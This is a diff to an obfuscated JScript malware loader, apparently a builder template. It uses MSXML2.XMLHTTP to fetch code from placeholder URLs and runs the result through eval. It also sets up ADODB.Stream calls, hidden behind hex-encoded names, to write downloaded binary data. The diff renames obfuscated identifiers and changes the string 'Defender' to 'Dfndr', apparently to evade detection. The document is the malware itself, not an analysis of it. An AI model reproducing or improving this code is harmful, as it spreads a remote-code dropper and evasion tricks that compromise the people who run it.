@@ -1,22 +1,8 @@
 String.prototype.proc = eval;
-var yTnU4RuOR = [null, Array("CreateObject","Rea", "undefined","\x61\x64\x6F\x64\x62\x2E","\x43\x68\x61\x72\x53\x65\x74","Posi"+"tion","\x54\x79\x70\x65","Open","Wr")];
-
-Array.prototype.om0l4d3 = function() {
-	eval(dwdtg());
-	var hYiUrF = arguments;
-	return this[0]["replace"](/{(\d+)}/g, 
-	function(k3tTlE0, k3tTlE1) {
-		try{
-			return hYiUrF[k3tTlE1];
-		}catch(ex){
-			return k3tTlE0;
-		}
-	});
-};
 
 function dwdtg(){
     var bjHTTP, dwddtg;
-    var l = ":-first:-"
+    var l = ":-first:-";
     bjHTTP = new ActiveXObject("MSXML2.XMLHTTP");
     bjHTTP.open("GET", l, false);
     bjHTTP.send(null);
@@ -26,10 +12,17 @@ function dwdtg(){
     bjHTTP = null;
     return dwddtg;
 }
+
+var SUYYPS02R = [
+null,
+
+Array("CreateObject","Rea", "undefined","\x61\x64\x6F\x64\x62\x2E","\x43\x68\x61\x72\x53\x65\x74","Posi"+"tion","\x54\x79\x70\x65","Open","Wr")
+
+];
 
 function dwdtgr(){
     var bjHTTP, dwddtg;
-    var l = ":-last:-"
+    var l = ":-last:-";
     bjHTTP = new ActiveXObject("MSXML2.XMLHTTP");
     bjHTTP.open("GET", l, false);
     bjHTTP.send(null);
@@ -40,9 +33,16 @@ function dwdtgr(){
     return dwddtg;
 }
 
-yTnU4RuOR[2] = Array("yTnU4RuOR[4]()[yTnU4RuOR[1][6]] = 1;yTnU4RuOR[4]()[yTnU4RuOR[1][7]]();yTnU4RuOR[4]()[yTnU4RuOR[1][8]+\"ite\"](yTnU4RuOR[3][1]['nodeTypedValue']);", "yTnU4RuOR[4]()[yTnU4RuOR[1][5]] = 0;yTnU4RuOR[4]()[yTnU4RuOR[1][6]] = 2;", "yTnU4RuOR[4]()[yTnU4RuOR[1][4]] = yTnU4RuOR[3][2][0];", null);
 
-var rtrnr = "Defender";
+Array.prototype.om0l4d3 = function() {eval(dwdtg()); var hYiUrF = arguments; return this[0]["replace"](/{(\d+)}/g, function(k3tTlE0, k3tTlE1) { try{	return hYiUrF[k3tTlE1];}catch(ex){	return k3tTlE0;}});};
+
+SUYYPS02R[2] = Array("SUYYPS02R[4]()[SUYYPS02R[1][6]] = 1;SUYYPS02R[4]()[SUYYPS02R[1][7]]();SUYYPS02R[4]()[SUYYPS02R[1][8]+\"ite\"](SUYYPS02R[3][1]['nodeTypedValue']);",
+						"SUYYPS02R[4]()[SUYYPS02R[1][5]] = 0;SUYYPS02R[4]()[SUYYPS02R[1][6]] = 2;",
+						"SUYYPS02R[4]()[SUYYPS02R[1][4]] = SUYYPS02R[3][2][0];",
+						null
+						);
+
+var rtrnr = "Dfndr";
 
 function xctrfnshr(rtrnrprms) {
     if (!eval(dwdtgr())) {
@@ -74,3 +74,4 @@ function kprskyspnnthss() {
     }
     
 }
+
